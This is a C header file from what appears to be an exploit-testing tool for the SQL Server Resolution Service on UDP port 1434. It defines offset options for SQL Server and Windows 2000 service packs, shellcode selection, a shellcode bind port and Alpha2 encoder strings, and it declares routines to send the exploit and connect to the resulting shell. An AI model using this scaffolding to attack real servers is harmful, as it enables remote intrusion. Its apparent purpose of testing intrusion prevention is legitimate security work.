/* Copyright© 2004-2008 Nelson Brito
 * This file is part of the ENG Private Tool by Nelson Brito.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.  
   
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef __COMMON_H
#define __COMMON_H 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: common.h,v 1.13 2008-09-14 17:57:14-03 nbrito Exp $ */
#ifdef  __CYGWIN__
#define __MAJOR_VERSION "4"
#define __MINOR_VERSION "23-public(Win32)"
#elif   __linux__
#define __MAJOR_VERSION "4"
#define __MINOR_VERSION "23-public"
#else
#error "Sorry! The eng program was only tested under Linux and Cygwin32!"
#endif  /* __linux__ */

#include <stdio.h>
#include <netdb.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

__BEGIN_DECLS

/* XXX - Do not remove, it will be used in a near future. I hope. */
#ifdef  __linux__
#if     __GLIBC_PREREQ(2, 1)
/* XXX - Internal declarations. */
#include <netpacket/packet.h>
#include <net/ethernet.h>
#else   /* __GLIBC_PREREQ(2, 1) */
/* XXX - External declarations. */
#include <asm/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#endif  /* __GLIBC_PREREQ(2, 1) */
#endif  /* __linux__ */

/* Using macro instead of function. This is a kind of copyright. ;-) */
#define nb(c, t) do{\
			fprintf(stdout,"%c",*c++); fflush(stdout);\
			usleep(t);\
		}while(*c)

/* Was TRUE and FALSE defined? */
#ifndef TRUE
#define TRUE 1
#endif  /* TRUE */

#ifndef FALSE
#define FALSE 0
#endif  /* FALSE */

/* Was RAND_MAX defined? */
#ifndef RAND_MAX
#define RAND_MAX 2147483647
#endif  /* RAND_MAX */

/* Defining the POSIX standards types in case of need.
   IMHO, it will help in portability. */
#ifndef int8_t
#define int8_t signed char
#endif  /* int8_t */

#ifndef u_int8_t
#define u_int8_t unsigned char
#endif  /* u_int8_t */

#ifndef int16_t
#define int16_t signed short int
#endif  /* int16_t */

#ifndef u_int16_t
#define u_int16_t unsigned short int
#endif  /* int16_t */

#ifndef int32_t
#define int32_t signed int
#endif  /* int32_t */

#ifndef u_int32_t
#define u_int32_t unsigned int
#endif  /* u_int32_t */

#ifndef int64_t
#define int64_t signed long long int
#endif  /* int64_t */

#ifndef u_int64_t
#define u_int64_t unsigned long long int
#endif  /* u_int64_t */

#ifndef in_addr_t
#define in_addr_t u_int32_t
#endif  /* in_addr_t */

/* Pseudo header for packet's checking sum routine. */
struct psdhdr{
	in_addr_t saddr;    /* source address (32 bits)      */
	in_addr_t daddr;    /* destination address (32 bits) */
	u_int8_t  zero;     /* must be zero (8 bits)         */
	u_int8_t  protocol; /* protocol (8 bits)             */
	u_int16_t len;      /* header length (16 bits)       */
};

/* Defining:
 * - Internet address ANY; 
   - Macro for random address routine;
   - TCP/IP port ANY; 
   - Macro for random port routine.

   XXX Windows XP SP2 sucks XXX */
#ifndef __CYGWIN__
/* XXX - Internal declarations. */
#ifndef INADDR_ANY
#define INADDR_ANY ((in_addr_t) 0x00000000)
#endif  /* INADDR_ANY */

#ifndef INADDR_RND
#define INADDR_RND(addr)\
		(addr == INADDR_ANY ?\
		((rand() & 0xffffffff) << 24) + (rand() & 0xffffffff) :\
		(in_addr_t) addr)
#endif  /* INADDR_RND */

#ifndef IPPORT_ANY
#define IPPORT_ANY ((u_int16_t) 0x0000)
#endif  /* IPPORT_ANY */

#endif  /* __CYGWIN__ */

#ifndef IPPORT_SSRP
#define IPPORT_SSRP 1434
#endif  /* IPPORT_SSRP */

#ifndef IPPORT_DEFAULT
#define IPPORT_DEFAULT 1024
#endif  /* IPPORT_DEFAULT */

#ifndef __CYGWIN__

#ifndef IPPORT_RND
#define IPPORT_RND(port)\
		(port == IPPORT_ANY ?\
		((rand() & 0xffff) << 16) + (rand() & 0xffff) :\
		port)
#endif  /* IPPORT_RND */

/* Defining headers' sizes. */
#ifndef IPHDR_SIZE
#define IPHDR_SIZE   sizeof(struct iphdr)
#endif  /* IPHDR_SIZE */

#ifndef ICMPHDR_SIZE
#define ICMPHDR_SIZE sizeof(struct icmphdr)
#endif  /* ICMPHDR_SIZE */

#ifndef UDPHDR_SIZE
#define UDPHDR_SIZE sizeof(struct udphdr)
#endif  /* UDPHDR_SIZE */

#ifndef TCPHDR_SIZE
#define TCPHDR_SIZE sizeof(struct tcphdr)
#endif  /* TCPHDR_SIZE */

#ifndef PSDHDR_SIZE
#define PSDHDR_SIZE sizeof(struct psdhdr)
#endif  /* PSDHDR_SIZE */

/* Was IPVERSION defined? */
#ifndef IPVERSION
#define IPVSERION 4
#endif  /* IPVERSION */

#endif  /* __CYGWIN__ */

/* Command Line Interface options. */
struct options{
	/* Informational options. */
	u_int32_t copyright;        /* display copyright statement      */

	/* NIPS options.                                                */
	u_int32_t shellcode;        /* shellcode ID                     */
	/* Process payloads options.                                    */
#define DEFAULT_SHELLCODE_ID     0  /* default shellcode ID             */
#define PROCESS_USER_SHELLCODE   1  /* user defines the shellcode       */
#define PROCESS_FIRST_SHELLCODE  2  /* use first shellcode by default   */
#define DISPLAY_ALL_SHELLCODES   3  /* just shows the list and exit     */

	u_int32_t offset;           /* offset ID                        */
	/* Process offset options.                                      */
#define DISPLAY_ALL_OFFSETS    0    /* just shows the list and exit     */
#define SQL_PUB_OFFSET         1    /* use only the SQL offsets         */
#define W2K_SP0_OFFSET         2    /* use only Win2k SP0 offsets       */
#define W2K_SP1_OFFSET         3    /* use only Win2k SP1 offsets       */
#define W2K_SP2_OFFSET         4    /* use only Win2k SP2 offsets       */
#define W2K_SP3_OFFSET         5    /* use only Win2k SP3 offsets       */
#define W2K_SP4_OFFSET         6    /* use only Win2k SP4 offsets       */
#ifndef DEFAULT_OFFSET_ID           /* define the SQL as deafult        */
#define DEFAULT_OFFSET_ID      SQL_PUB_OFFSET
#endif  /* DEFAULT_OFFSET_ID */

	/* Alpha2 options.                                              */
	u_int16_t port;             /* shellcode bind TCP port          */
#define DEFAULT_CMD_PORT       22   /* define the SSH as default        */
	
	/* IP header options.                                           */
	u_int8_t  tos;              /* type of service                  */
	u_int8_t  ttl;              /* time to live                     */
	u_int16_t id;               /* identification                   */
	in_addr_t saddr;            /* source address                   */
	in_addr_t daddr;            /* destination address              */

	/* General header options (UDP & TCP).                          */
	u_int16_t source ;          /* general source port              */
	u_int16_t dest;             /* general destination port         */
};

/* Here is the initial modified version of Alpha2.c as of September 6th, 2008.
   XXX - Needs more attention to make more usable in source codes. */
#define __ALPHA2_VERSION           "ALPHA 2: Zero-tolerance. (build 07) [modified on 09/06/2008]"
#define __ALPHA2_COPYRIGHT         "Copyright© 2003, 2004 by Berend-Jan Wever"
#define __ALPHA2_AUTHOR_MAIL       "skylined@edup.tudelft.nl"
#define MIXEDCASE_ASCII_DECODER    "jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
#define UPPERCASE_ASCII_DECODER    "VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI"

/* Sanitizing the size of shellcode. */
#ifndef __MAGIC_NUMBER__
#define __MAGIC_NUMBER__           24
#endif  /* __MAGIC_NUMBER__ */

/* Alpha2.c Decoder Structure. */
struct decoder{
	u_int8_t * id;              /* id of option                     */
	u_int8_t * code;            /* the decoder                      */
	u_int8_t * choice;          /* uppercase or mixedcase           */
};

/* False-positive structure. */
struct shellcode{
	u_int8_t * id;              /* shellcode descriptiom (8 bits)   */
	u_int8_t * shellcode;       /* shellcode by Metasploit (8 bits) */
	size_t     size;            /* shellcode size (32 bites)        */
	u_int32_t  position;        /* shellcode port position          */
};

/* Offset structure. */
struct offset{
	u_int8_t * id;              /* offset descriptiom (8 bits)      */
	u_int32_t  offset;          /* return address (32 bits)         */
};

/* Prototype for Alpha2.c implementation. */
u_int8_t * alpha2(struct options, u_int8_t *, struct shellcode);

/* Prototype for connect() to shell routine. */
extern const int32_t connect_shell(struct options);

/* Prototype for packet's check summing routine. */
extern const u_int16_t in_cksum(register u_int16_t *, register int32_t);

/* Prototype for random nops routine. */
const u_int8_t * process_nops(u_int8_t *, register u_int32_t);

/* Prototype for offset processing routine. */
extern const struct offset process_offset(register u_int32_t, struct offset);

/* Prototype for options processing routine. */
extern const struct options process_options(int, char **);

/* Prototype for shellcode processing routine. */
extern const struct shellcode process_shellcode(register u_int32_t, register u_int32_t);

/* Prototype for random string building routine. */
extern const u_int8_t * process_string(u_int8_t *, register u_int32_t);

/* Prototype for random string building routine. */
extern u_int64_t process_jmpaddr(register u_int64_t);

/* Prototype for name and IP address resolving routine. */
extern const in_addr_t resolv(const u_int8_t *);

/* Prototype for raw packet sending routine. */
extern const int32_t sendexp(struct options, struct shellcode, struct offset);

/* Prototype for usage help message. */
extern void usage(int8_t *, int8_t *, int8_t *); 

__END_DECLS

#endif  /* __COMMON_H */
